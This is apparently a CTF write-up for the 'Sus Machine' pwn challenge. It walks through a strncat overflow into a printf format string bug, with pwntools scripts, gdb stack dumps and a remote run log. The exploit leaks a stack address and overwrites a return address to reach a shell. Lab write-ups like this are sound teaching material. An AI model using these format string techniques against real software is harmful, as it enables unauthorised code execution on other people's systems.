---
title: Sieberrsec 4.0
date: 2023-01-14
excerpt: Sieberrsec 4.0 - Sus Machine
category: writeups
tags:
    - pwn
---

This is a challenge from Sieberrsec 4.0. I thought it was a pretty good
challenge that taught me how to properly use gdb for pwn.

Description:

I built a simple program to simulate Among Us.

- This challenge is quite hard (relative to the others)
- That's why we're giving prizes to the first person to solve this
- Server runs libc 2.31 (Dockerfile provided)
- This is not a heap challenge

---

For this challenge, source and Dockerfile was given. Since I had the Dockerfile,
the first thing I did was to locate and copy the libc to my host. I wanted to
patch the binary using `pwninit` so that my environment was as similar to remote
as possible, but the patcher strangely couldn't detect the libc version, which
means our linker couldn't be automatically resolved and downloaded.

Ultimately, libc wasn't really that important for this challenge so it's all
good.

# Analysis

On first reading through the source, I immediately spotted the format string
vuln that is only triggered if a crewmate is killed. It passes my name (by
default "Impostor") into printf directly. However, there's no built-in way to
control this value.

The program's behaviour is as such:
1. Read up to 19 characters (using `fgets`) into `crewmateName`, a buffer with
   20 bytes allocated. This part is safe since we can't overflow `crewmateName`.
2. Concatenate the contents of `crewmateName` into a global variable `input`.
   This global variable is of size 50 and is initialized to "Dummy input". Note
   that in `strncat`, the trailing null byte of `input` is replaced by the first
   character of `crewmateName`.
3. Iterate through the global array `crewmates` and check if any of the items
   are found in `input`.
   1. If true, the vulnerable `printf` is called and the first character of
      `input` is set to a null byte (effectively clearing it out)

From this I identified another vuln - `strncat` doesn't check the length of
`input`! This allows me to overflow out of `input`, into `name`. Hence, this is
how I'll control `name` to exploit the FSB.

# Exploit

It all seems very simple, until I realized - it's full RELRO...

For most FSB challs, I've usually seen either 1 of these:
1. Partial RELRO - overwrite GOT
2. Full RELRO with buffer overflow - leak canary, PIE and libc base, then
   ret2win

So I thought it probably was no. 2.

But this one is kinda different for 3 reasons:
1. There's no stack-based buffer overflow! So there's no way I could control RIP
   with an overflow.
2. My input is partially out of stack (in .bss region). This makes format string
   writes a little harder since I can't use `fmtstr_payload` to generate my
   payload.
3. My input (in some sense) has a limit of 17 characters, which really restricts
   the length of my payload, again forcing me not to use `fmtstr_payload`.

Since I probably needed to leak some values first, I set a breakpoint at the
vulnerable `printf` to examine the stack at the point of FSB:

```
gef➤  telescope 0x007fffffffe450
0x007fffffffe450│+0x0000: 0x007fffffffe480  →  0x007fffffffe4a0  →  0x0000000000000001	← $rsp
0x007fffffffe458│+0x0008: 0x0000000231000000
0x007fffffffe460│+0x0010: 0x00000a6b6e6970 ("pink\n"?)
0x007fffffffe468│+0x0018: 0x007fffffffe4a0  →  0x0000000000000001
0x007fffffffe470│+0x0020: 0x0000000000000000
0x007fffffffe478│+0x0028: 0x8161b579afafd700
0x007fffffffe480│+0x0030: 0x007fffffffe4a0  →  0x0000000000000001	← $rbp
0x007fffffffe488│+0x0038: 0x005555555554be  →  <main+131> mov eax, 0x0
0x007fffffffe490│+0x0040: 0x0000000000000000
0x007fffffffe498│+0x0048: 0x8161b579afafd700
```

1. 0x007fffffffe488 - This is the address I want to write to. When disassembling
   `main`, I can see that this is the next instruction after the call to `vuln`.
   So if I were to overwrite this, exiting `vuln` would allow me to control the
   program flow. Also, this address will allow me to leak PIE.
2. 0x007fffffffe480 - This address points to 0x007fffffffe4a0, which is always a
   fixed offset from the address I want to control (0x007fffffffe4a0 -
   0x007fffffffe488 = 0x18).

So, the plan is to leak these 2 addresses via FSB, and then on a second write,
control the value at the 1st address which would give me my RCE. :)

(ps. actually, leaking the 1st address isn't necessary - the author made it such
that the 2nd last byte of `main` and `vent` are always the same regardless of
PIE, and PIE doesn't affect the last 3 nibbles. So PIE is irrelevant in this
case.)

---

While experimenting with the binary, I also figured out how to fill up the
`input` buffer so that I would land exactly at the start of `name`. However, for
subsequent overflows after the first time we call `printf`, we need 11 more
characters since "Dummy input" is no longer there.

```py
# this works only for the first overflow - subsequently, we need to add these 2 lines:
# p.sendline(b'1')
# p.sendline(b'a'*10)
def setup_buffer(p):
    for i in range(2):
        p.sendline(b'1')
        p.sendline(b'a'*17)
    p.sendline(b'1')
    p.sendline(b'a'*8)
```

---

Back to the FSB - how can I determine the offsets to leak values from? Well,
looking at the stack, "pink" should be at offset 8, and $rbp (the value we want
to leak) at offset 12. I confirmed this by testing out offset 12, and true
enough the expected value is there.

The below script will leak the value and calculate the address of our target:

```py
    setup_buffer(p)

    payload = b"%12$p"
    p.sendline(b'1')
    p.sendline(payload)

    p.sendline(b'1')
    p.sendline(b'pink')

    p.recvuntil(b'killed by ')
    rip = int(p.recvline().strip().decode(), 16) - 0x18
    print(f'rip @ {hex(rip)}')
```

To execute the write, we can use `%n`, which writes the number of characters
printed so far into the address at the specified offset. For example, if my
payload was as such:

`aaaa%8$n`

and the value at offset 8 is 0xdeadbeef, then 0x4 would be written to
0xdeadbeef. Note that 0xdeadbeef is the start of the write - %n will write to
the following 8 bytes as well, which sets everything to 0x00 except 0xdeadbeef,
which is set to 0x04.

But like I said earlier, I don't want to control the entire address - just the
last byte! Hence, I can use `%hhn` which only writes 1 byte instead of 8 bytes.

As I identified earlier, the offset of my input ("pink" in the earlier case) is
8. Controlling this value will allow me to control the address I'm writing to,
so I'll need to set it to the leaked address of $rip. 

I also need to trigger the write together with my write address. But since there
are null bytes at the start of $rip, I'll need to shift the address to the end,
changing my offset to 9 instead.

```py
    setup_buffer(p)

    p.sendline(b'1')
    p.sendline(b'a'*10)

    # here, I just want the last byte of vent
    num_chars = int(hex(elf.sym.vent)[-2:], 16)
    payload = f'%{num_chars}c%9$hhn'
    p.sendline(b'1')
    p.sendline(payload)

    p.sendline(b'1')
    p.sendline(b'pinkaaaa' + p64(rip))
```

(if you're confused about why I write to the start of $rip when I actually want
to control the last byte, do read up on little endian)

As a PoC, here's the stack before my write:

```
gef➤  telescope 0x007fffb9f9a340
0x007fffb9f9a340│+0x0000: 0x007fffb9f9a370  →  0x007fffb9f9a390  →  0x0000000000000001	← $rsp
0x007fffb9f9a348│+0x0008: 0x0000000231000000
0x007fffb9f9a350│+0x0010: 0x6100000a6b6e6970 ("pink\n"?)
0x007fffb9f9a358│+0x0018: 0x616161616161000a ("\n"?)
0x007fffb9f9a360│+0x0020: 0x00000000000a61 ("a\n"?)
0x007fffb9f9a368│+0x0028: 0x1bd98944c0702700
0x007fffb9f9a370│+0x0030: 0x007fffb9f9a390  →  0x0000000000000001	← $rbp
0x007fffb9f9a378│+0x0038: 0x0055ef72c6c4be  →  <main+131> mov eax, 0x0
0x007fffb9f9a380│+0x0040: 0x0000000000000000
0x007fffb9f9a388│+0x0048: 0x1bd98944c0702700
```

and after my write:
```
gef➤  telescope 0x007fffb9f9a340
0x007fffb9f9a340│+0x0000: 0x007fffb9f9a370  →  0x007fffb9f9a390  →  0x0000000000000001	← $rsp
0x007fffb9f9a348│+0x0008: 0x0000000231000000
0x007fffb9f9a350│+0x0010: 0x616161616b6e6970
0x007fffb9f9a358│+0x0018: 0x007fffb9f9a378  →  0x0055ef72c6c4d9  →  <vent+0> endbr64 
0x007fffb9f9a360│+0x0020: 0x0000000000000a ("\n"?)
0x007fffb9f9a368│+0x0028: 0x1bd98944c0702700
0x007fffb9f9a370│+0x0030: 0x007fffb9f9a390  →  0x0000000000000001	← $rbp
0x007fffb9f9a378│+0x0038: 0x0055ef72c6c4d9  →  <vent+0> endbr64 OVERWRITTEN!! :)
0x007fffb9f9a380│+0x0040: 0x0000000000000000
0x007fffb9f9a388│+0x0048: 0x1bd98944c0702700
```

Afterwards, I can just exit `vuln` to jump to `vent` and cat the flag. :)

```
[*] '/home/samuzora/ctf/writeups/sieberrsec-4.0/sus-machine/dist/chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to de.irscybersec.ml on port 1337: Done
rip @ 0x7ffc3da999f8
  p.sendline(payload)
[*] Switching to interactive mode
pink
.

Menu:
1. Kill Crewmate
2. Leave game
> Enter crewmate name: Menu:
1. Kill Crewmate
2. Leave game
> Enter crewmate name: Menu:
1. Kill Crewmate
2. Leave game
> Enter crewmate name: Menu:
1. Kill Crewmate
2. Leave game
> Enter crewmate name: Menu:
1. Kill Crewmate
2. Leave game
> Enter crewmate name: Menu:
1. Kill Crewmate
2. Leave game
> Enter crewmate name: 

⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⣔⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡝⠉⠉⠽⣿⣃⣼⣷⠶⣦⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠫⢿⣄⠀⠀⠈⣿⠁⠀⠀⣁⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢛⣷⢂⠀⠀⠀⣀⡷⢣⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⣿⡾⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣿⠀⠀⠀⣿⠇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢚⣾⠀⠀⠀⣽⡀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⣿⠀⠀⠀⣿⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⣿⡏⠉⣙⣿⣿⣷⣶⣖⣷⣶⣿⣿⡲⣶⣲⣿⢗⣶⣖⣶⣲⣾⣛⢗⣷⠀⠀⠀
⠀⣿⣿⠁⠀⠉⣿⣿⡟⠛⠟⠝⠏⢙⠉⠙⠉⠋⠍⠙⠙⠉⠛⠛⠛⣻⣿⣿⠀⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀
⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀
⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀
⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⠀⢠⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿⡏⠁⠀⠀⢸⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿⠁⠀⠈⠻⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


pink was killed by                                                                                                                                                                                                                          
pinkaaaa\xf8\x99\xa9=\xfc\x7f.

Menu:
1. Kill Crewmate
2. Leave game
> $ ls
bin
chal
dev
flag
lib
lib32
lib64
libx32
usr
$ cat flag
IRS{7h47_buff3r_15_k1nd4_5u5}
```

